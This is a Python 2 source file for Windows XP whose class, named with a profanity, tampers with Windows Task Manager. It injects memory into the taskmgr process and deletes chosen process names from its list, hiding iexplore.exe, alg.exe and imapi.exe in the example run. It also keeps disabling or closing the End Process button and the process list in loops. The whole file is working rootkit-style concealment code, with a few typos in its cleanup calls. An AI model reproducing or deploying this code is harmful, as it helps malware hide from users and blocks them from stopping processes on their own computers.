import win32api,win32con,win32process,ctypes,win32com,win32service
import guiControl as trol
import win32process,win32com,win32con,pythoncom

LVM_FIRST = 4096
LVM_DELETEITEM = LVM_FIRST +8
LVM_SORTITEMS = LVM_FIRST +84
LVM_DELETECOLUMN = LVM_FIRST + 28
LVM_GETITEMTEXTW = LVM_FIRST + 115
LVM_GETITEMTEXT = LVM_FIRST + 45
LVM_FINDITEM = LVM_FIRST + 13
LVM_GETITEMTEXT  = 0x102D
LVM_GETITEMCOUNT = 0x1004
LVM_SETITEMPOSITION = 4111

MEM_RELEASE = 32768

# prototyped on xp


class taskfuck:

    def __init__( self ):

        global  win32gui, win32api,guiControl ,time,wmi,win32gui,atexit
        import win32gui, win32api,guiControl ,time,wmi,win32gui,atexit

        self.c=None

        self.proc = None
        self.virt = None

        atexit.register(self.cleanup)

        try: import psyco  ; psyco.full()
        except Exception,e:print e


    def getendbutton(self): # find the id to the End Process Button

         try:
                global dialog,listview,endbutton

                taskwin = self.gettaskman()
                if taskwin:
                    dialog = win32gui.FindWindowEx( taskwin , 0 , None,None)
                    listview= self.finder ( taskwin , "processes", "syslistview")
                    if type(listview) == list: listview = listview[0]

                    if listview and dialog:
                        endbutton = win32gui.FindWindowEx(dialog,listview,"Button" , "&End Process")
                        if endbutton :
                            return endbutton
                return 0
         except Exception,e:
             print e
             return 0


    def closebuttonloop (self):   # keep the End Process Button Closed

        errorlevel = 0

        while True :
            try:
                global dialog,listview,endbutton

                taskwin = win32gui.FindWindow ( None , "Windows Task Manager" )

                if taskwin:
                        dialog = win32gui.FindWindowEx( taskwin , 0 , None,None)
                        listview= self.finder ( taskwin , "processes", "syslistview")
                        if type(listview) == list: listview = listview[0]

                        if listview and dialog:
                            endbutton = win32gui.FindWindowEx(dialog,listview,"Button" , "&End Process")
                            if endbutton :
                                win32gui.CloseWindow ( endbutton )

                time.sleep(0.1)
            except Exception,error:
                errorlevel +=1
                if errorlevel > 5 : return
                print error
                time.sleep(1)


    def gettaskman(self):  # get the task managers window id

        try: return win32gui.FindWindow ( None , "Windows Task Manager" )
        except Exception,error:print error ; return 0

    def getlistview (self,text="processes"):  # get the process list id
        try: return self.finder ( self.gettaskman (), text, "syslistview")
        except Exception,error:  print error ;    return 0

    def getdialog ( self ):
        try: return win32gui.FindWindowEx( self.gettaskman() , 0 , None,None)
        except Exception,error:print error ; return 0

    def findlv (self,  han):
        found = []

        for i in guiControl.findControls( han ):
            if win32gui.GetWindowText( i ) == "Processes" and win32gui.GetClassName(i) == "SysListView32":
                found.append( i )
        return found

    def finder (self,  handle , text = None, classname = None):

        found = []

        for con in guiControl.findControls ( handle ):
            if text in win32gui.GetWindowText ( con ).lower() and classname in win32gui.GetClassName( con ).lower():
                found.append( con )

        return found

    def delitem (self, listview,item_num):  # delete a listview item
        try: win32gui.SendMessage ( listview, LVM_DELETEITEM , item_num, 0 )
        except Exception,e:print e


    def delcolumnsloop(self): # delete process list columns

        oldwin = None

        while True:
            try:

                taskwin = win32gui.FindWindow ( None , "Windows Task Manager" )

                if taskwin:
                    if not taskwin == oldwin:
                        oldwin = taskwin

                        dialog = win32gui.FindWindowEx( taskwin , 0 , None,None)
                        listview= self.finder ( taskwin , "processes", "syslistview")[0]

                        if listview:
                            x= 1
                            while x is 1:
                                time.sleep(0.002)
                                x = win32gui.SendMessage( listview , LVM_DELETECOLUMN,0,0)

                time.sleep(0.1)
            except Exception,error:
                print error
                time.sleep(1)

    def closecolumnsloop( self ):  # keep process list closed

        oldwin = None

        while True:
            try:

                taskwin = win32gui.FindWindow ( None , "Windows Task Manager" )

                if taskwin and not taskwin == oldwin:

                        oldwin = taskwin

                        dialog = win32gui.FindWindowEx( taskwin , 0 , None,None)
                        listview= self.finder ( dialog , "processes", "syslistview")[0]

                        if listview:
                            win32gui.CloseWindow ( listview )

                time.sleep(0.05)
            except Exception,error:
                print error
                time.sleep(1)


    def send ( self,han , a=None,b=None,c=None): # send a message to a id
        return win32gui.SendMessage ( han , a,b,c)

    def getitemcount (self,lv =None):  # get process list itemCount
        try:

            if not lv:
                lv = self.getlistview ()[0]
            return win32gui.SendMessage ( lv , LVM_GETITEMCOUNT , 0 , 0 )
        except :return 0

    def openp (self):  # open a process / plan A

        tip=win32process.GetWindowThreadProcessId(t.getlistview()[0])


        han = win32api.OpenProcess (  win32con.PROCESS_ALL_ACCESS , False, int(self.findtmproc() ))
        return han

    def findtmproc (self): # get task managers process id

        if not self.c:
            pythoncom.CoInitialize()
            self.c = wmi.WMI()
            time.sleep(1)

        tid = None
        procs = self.c.win32_process()

        for p in procs:
            if p.name == "taskmgr.exe":
                return p.handle
        return 0

    def enumtaskman(self):  # print out  task manager controls
        for con in trol.findControls ( self.gettaskman() ) :
            print con , win32gui.GetClassName( con ), win32gui.GetWindowText ( con )
            time.sleep(0.002)

    def disablewins(self,arg=False): # disable the endprocess button

        listview = self.getlistview()[0]
        endprocessbutton = self.getendbutton()

        if listview: win32gui.EnableWindow ( listview , bool(arg) )
        if endprocessbutton: win32gui.EnableWindow ( endprocessbutton , bool(arg) )

    def disablewinsloop ( self, arg=False): # keep the end process button closed
        oldwin=None
        while True :
            try:
                taskwin = self.gettaskman()
                if taskwin and not taskwin == oldwin:
                    oldwin = taskwin
                    dialog = win32gui.FindWindowEx( taskwin , 0 , None,None)
                    listview= self.finder ( dialog , "processes", "syslistview")[0]
                    if listview:
                        self.disablewins ( arg )
                time.sleep(0.1)
            except Exception,error:
                print error
                time.sleep(1)


    def openpB ( self , processName=None, windowTitle=None): # open a process / plan B

        ID = win32gui.FindWindow ( processName , windowTitle )
        if not ID : return 0    # no task man window open

        global  ctypes,wintypes
        from win32con import PROCESS_ALL_ACCESS
        from win32process import GetWindowThreadProcessId
        from ctypes import wintypes

        import ctypes,pywinauto

        PROCESS_VM_OPERATION = pywinauto.win32defines.PROCESS_VM_OPERATION
        PROCESS_VM_READ = pywinauto.win32defines.PROCESS_VM_READ
        PROCESS_VM_WRITE =pywinauto.win32defines.PROCESS_VM_WRITE
        PROCESS_QUERY_INFORMATION =pywinauto.win32defines.PROCESS_QUERY_INFORMATION

        try: #  create Handle to process.

            # ID = win32gui.FindWindow ( processName , windowTitle )

            TID = GetWindowThreadProcessId ( ID )    [-1]

            # If the function succeeds
            # the return value is an open handle to the specified process.
            Handle = ctypes.windll.kernel32.OpenProcess (\

                PROCESS_VM_OPERATION|PROCESS_VM_READ|PROCESS_VM_WRITE |PROCESS_QUERY_INFORMATION,# This access right is checked against the
                # security descriptor for the process.
                False, # If this value is TRUE, processes created by this process will inherit the handle.
                TID    ) # The identifier of the local process to be opened.
            return Handle
        except Exception,error:  print error


    def mainloop(self,hideme ="alg.exe" ):  # find process name(S) in task manager listview and remove them
        # hideme can be a list of names
        """ hides all accurences of hideme """

        import pywinauto
        from pywinauto import win32defines

        VirtualAlloc = ctypes.windll.kernel32.VirtualAllocEx
        WriteProcessMemory= ctypes.windll.kernel32.WriteProcessMemory
        ReadProcessMemory = ctypes.windll.kernel32.ReadProcessMemory

        while True:
            try:

                proc = self.openpB(windowTitle = "Windows Task Manager")
                if not proc:   # no task man window.
                    time.sleep(0.001)
                    continue

                listview = self.getlistview()
                if type(listview) == list: listview = listview[0]
                if not proc or not listview: # no listview
                    time.sleep(0.001)
                    continue

                item = pywinauto.win32structures.LVITEMW()  # create win32 listview item

                null = ctypes.c_int()  # a ctypes null
                item_buff = ctypes.create_string_buffer(512)  #a ctype buffer

                # allocating memory in task manager process so we can  read/write  to it
                _lvi = VirtualAlloc ( proc, null , ctypes.sizeof(item),
                                       win32defines.MEM_COMMIT ,
                                       win32defines.PAGE_READWRITE  )

                item.cchTextMax = 512

                while True:

                    icount = self.getitemcount(listview) # use found list view to get item count
                    if not icount:icount = self.getitemcount() # default/find new listview and get item count from it
                    if not icount: # no task man window
                        #break # go back to outer loop
                      try:
                          ctypes.windll.kernel32.CloseHandle( proc )
                          ctypes.windll.kernel32.VirtualFreeEx(proc , _lvi, 0, MEM_RELEASE )
                          print "Cleand up"
                      except Exception,e:print e
                      break


                    for X in range ( icount ):


                        item.iSubItem=0
                        item.pszText =_lvi   # point to mem in open process
                        pna = ctypes.c_ulong ( 0 )  # recvs len of data written

                        # write the listView item to our allocated memory in open process
                        WriteProcessMemory ( proc , _lvi,ctypes.addressof( item),
                                             ctypes.sizeof(item),ctypes.byref (pna)    )

                        # send the getitem msg to the taskman listview with a memory  address to write to (_lvi)
                        win32gui.SendMessage ( listview , LVM_GETITEMTEXT, X ,_lvi)

                        newb= ctypes.create_string_buffer(512)      # a ctype buffer  / recvs taskman listbox item text
                        pn = ctypes.c_ulong ( 0 )  # recvs len of  data written

                         # read our allocated mem in taskman proc, and store in ctype buffer (newb)
                        ReadProcessMemory ( proc , _lvi,ctypes.byref( newb ) , 512,ctypes.byref ( pn )  )
                        procname =  newb.value

                        if procname in hideme:
                            print "removing"
                            self.pause()  # pause the task manager updates
                            self.delitem( listview, X)  # delete the item

                         #   time.sleep(0.002)

                        time.sleep(0.001)

            except Exception,error:
                print error
                try:
                    ctypes.windll.lernel32.CloseHandle( proc )
                    ctypes.windll.kernel32.VirtualFreeEx(proc , _lvi, 0, MEM_RELEASE )
                    print "Cleand up"
                except Exception,e:print e

                time.sleep(0.5)

    def cleanup(self): # free virtual alloct mem
        try:ctypes.windll.lernel32.CloseHandle( self.proc )
        except:pass
        try:ctypes.windll.kernel32.VirtualFreeEx(proc , _lvi, 0, MEM_RELEASE )
        except:pass


    def pause(self):  # set task managers update speed to paused
        ID = self.getpausemenuitemid()
        if ID:  win32gui.SendMessage ( self.gettaskman(), win32con.WM_COMMAND, ID , 0 )


    def getpausemenuitemid( self): # get the pause menu item id

        w = self.gettaskman()
        m = win32gui.GetMenu(w)
        sm = win32gui.GetSubMenu (m , 2)
        ssm = win32gui.GetSubMenu(sm , 1)
        pauseID = win32gui.GetMenuItemID ( ssm , 3)
        return pauseID



if __name__ == "__main__":
    t=taskfuck()
    t.mainloop(hideme = ["imapi.exe","alg.exe","iexplore.exe"]  )

#cad
